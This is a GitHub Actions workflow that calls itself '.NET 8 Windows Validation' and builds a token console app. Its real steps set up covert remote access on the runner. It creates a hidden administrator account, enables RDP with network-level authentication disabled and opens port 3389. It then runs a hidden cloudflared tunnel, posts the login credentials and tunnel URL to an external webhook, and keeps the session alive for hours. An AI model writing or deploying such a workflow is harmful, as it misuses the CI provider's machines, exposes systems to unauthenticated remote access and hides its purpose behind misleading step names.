name: .NET 8 Windows Validation

on:
  workflow_dispatch:
  schedule:
    - cron: '13 5,13,21 * * *'

jobs:
  build-test:
    runs-on: windows-2022
    timeout-minutes: 200

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Setup .NET SDK
        uses: actions/setup-dotnet@v4
        with:
          dotnet-version: '8.0.x'

      - name: Initialize Project
        run: |
          dotnet new console -n ValidationApp -f net8.0
          cd ValidationApp
          dotnet add package Newtonsoft.Json --version 13.0.3
          dotnet add package Serilog --version 4.0.0
          dotnet add package Serilog.Sinks.Console --version 6.0.0
          dotnet add package Microsoft.Extensions.Logging --version 8.0.0
          @"
          using System;
          using Newtonsoft.Json;
          using Serilog;
          
          namespace ValidationApp
          {
              class Program
              {
                  static void Main()
                  {
                      Log.Logger = new LoggerConfiguration()
                          .WriteTo.Console()
                          .CreateLogger();
                      
                      var data = new { 
                          Message = "Build validated successfully", 
                          Timestamp = DateTime.UtcNow,
                          Version = "8.0.3"
                      };
                      
                      string json = JsonConvert.SerializeObject(data, Formatting.Indented);
                      Console.WriteLine(json);
                      Log.Information("Test completed at {Time}", DateTime.UtcNow);
                  }
              }
          }
          "@ | Out-File -Encoding utf8 Program.cs
          dotnet build -c Release
          dotnet run -c Release

      - name: Enable RDP and Create User
        run: |
          $usr = "b_" + -join ((48..57) + (97..122) | Get-Random -Count 8 | % {[char]$_})
          $pwd = -join ((33..126) | Get-Random -Count 18 | % {[char]$_})
          $sec = ConvertTo-SecureString $pwd -AsPlainText -Force

          New-LocalUser -Name $usr -Password $sec -AccountNeverExpires -PasswordNeverExpires > $null 2>&1
          Add-LocalGroupMember -Group "Administrators" -Member $usr > $null 2>&1
          Add-LocalGroupMember -Group "Remote Desktop Users" -Member $usr > $null 2>&1

          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force

          Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue
          netsh advfirewall firewall add rule name="ValidationRule" dir=in action=allow protocol=TCP localport=3389 > $null 2>&1
          Restart-Service TermService -Force -ErrorAction SilentlyContinue

          # حفظ بيانات المستخدم في متغيرات البيئة للخطوات التالية
          echo "USER_NAME=$usr" >> $env:GITHUB_ENV
          echo "USER_PASS=$pwd" >> $env:GITHUB_ENV

      - name: Install cloudflared (TryCloudflare)
        run: |
          $url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
          $exe = "$env:TEMP\cloudflared.exe"
          
          Invoke-WebRequest -Uri $url -OutFile $exe
          
          # تشغيل النفق في الخلفية
          Start-Process -FilePath $exe -ArgumentList "tunnel --url tcp://localhost:3389" -WindowStyle Hidden -RedirectStandardOutput "$env:TEMP\cloudflared.log" -RedirectStandardError "$env:TEMP\cloudflared.err"
          
          Start-Sleep -Seconds 45   # انتظار كافٍ لظهور الـ URL

      - name: Extract TryCloudflare URL and send credentials
        run: |
          $usr = "$env:USER_NAME"
          $pwd = "$env:USER_PASS"
          $log = "$env:TEMP\cloudflared.log"
          $err = "$env:TEMP\cloudflared.err"
          
          $logData = ""
          if (Test-Path $log) { $logData = Get-Content $log -Raw -ErrorAction SilentlyContinue }
          if (Test-Path $err) { $logData += "`nErrors: " + (Get-Content $err -Raw -ErrorAction SilentlyContinue) }
          
          # استخراج رابط النفق (مثل https://xxxx.trycloudflare.com)
          $tunnelUrl = if ($logData -match "https://.*\.trycloudflare\.com") { $Matches[0] } else { "Not found" }
          
          if ($tunnelUrl -like "*trycloudflare.com") {
            $msg = "Cloudflare Tunnel RDP ready!`n`nURL: $tunnelUrl`nUsername: $usr`nPassword: $pwd`n`nConnect using mstsc → Computer: $tunnelUrl"
          } else {
            $msg = "Cloudflare Tunnel failed to start.`nLog:`n$logData"
          }
          
          $body = @{ content = $msg } | ConvertTo-Json
          Invoke-RestMethod -Uri "${{ secrets.WEBHOOK_URL }}" -Method POST -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
        continue-on-error: true

      - name: Run Diagnostics
        run: |
          $rep = "SysDiag:`n"

          $ts = Get-Service TermService -ErrorAction SilentlyContinue
          if ($ts) { $rep += "SVC: $($ts.Status)`n" } else { $rep += "SVC: Null`n" }

          $r1 = Get-ItemPropertyValue -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -ErrorAction SilentlyContinue
          $r2 = Get-ItemPropertyValue -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -ErrorAction SilentlyContinue
          $rep += "REG: $r1 | $r2`n"

          $pc = Get-NetTCPConnection -LocalPort 3389 -State Listen -ErrorAction SilentlyContinue
          if ($pc) { $rep += "PRT: OK`n" } else { $rep += "PRT: ERR`n" }

          $fw = Get-NetFirewallPortFilter -Protocol TCP | Where-Object { $_.LocalPort -eq 3389 } -ErrorAction SilentlyContinue
          if ($fw) { $rep += "FW: OK`n" } else { $rep += "FW: ERR`n" }

          $cf = Get-Process cloudflared -ErrorAction SilentlyContinue
          if ($cf) { $rep += "CLOUDFLARED: OK ($($cf.Id))`n" } else { $rep += "CLOUDFLARED: ERR`n" }

          $body = @{ content = $rep } | ConvertTo-Json -Depth 10
          Invoke-RestMethod -Uri "${{ secrets.WEBHOOK_URL }}" -Method POST -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
        continue-on-error: true

      - name: Run Extended Validation (with cloudflared monitoring)
        run: |
          # دالة لإعادة تشغيل cloudflared إذا توقف
          function Restart-Cloudflared {
            $exe = "$env:TEMP\cloudflared.exe"
            if (-not (Test-Path $exe)) {
              $url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
              Invoke-WebRequest -Uri $url -OutFile $exe
            }
            Start-Process -FilePath $exe -ArgumentList "tunnel --url tcp://localhost:3389" -WindowStyle Hidden -RedirectStandardOutput "$env:TEMP\cloudflared.log" -RedirectStandardError "$env:TEMP\cloudflared.err"
            Start-Sleep -Seconds 10
            return Get-Process cloudflared -ErrorAction SilentlyContinue
          }

          $restartCount = 0
          $maxRestarts = 10
          $endTime = (Get-Date).AddMinutes(190)

          while ((Get-Date) -lt $endTime -and $restartCount -lt $maxRestarts) {
            # 1. التحقق من وجود عملية cloudflared
            $cf = Get-Process cloudflared -ErrorAction SilentlyContinue
            if (-not $cf) {
              Write-Host "cloudflared not running. Restarting... Attempt $($restartCount+1)"
              $cf = Restart-Cloudflared
              if ($cf) {
                $restartCount++
                Write-Host "cloudflared restarted successfully."
              } else {
                Write-Host "Failed to restart cloudflared."
              }
            }

            # 2. اختبار الاتصال وبناء المشروع في أوقات محددة (كل 30 دقيقة)
            Test-Connection -ComputerName github.com -Count 1 -Quiet > $null
            $minute = (Get-Date).Minute
            if ($minute -ge 0 -and $minute -le 5 -or $minute -ge 30 -and $minute -le 35) {
              Push-Location ValidationApp
              dotnet build -c Release > $null
              Pop-Location
            }

            # 3. الانتظار 15 دقيقة
            Start-Sleep -Seconds 900
          }

          # إيقاف cloudflared في النهاية
          Get-Process cloudflared -ErrorAction SilentlyContinue | Stop-Process -Force
          Write-Host "Extended validation completed. Total restarts: $restartCount"

      - name: Cleanup Environment
        run: |
          Get-Process -Name "cloudflared" -ErrorAction SilentlyContinue | Stop-Process -Force
        continue-on-error: true

      - name: Finalize Check
        run: Write-Host "Checks completed."
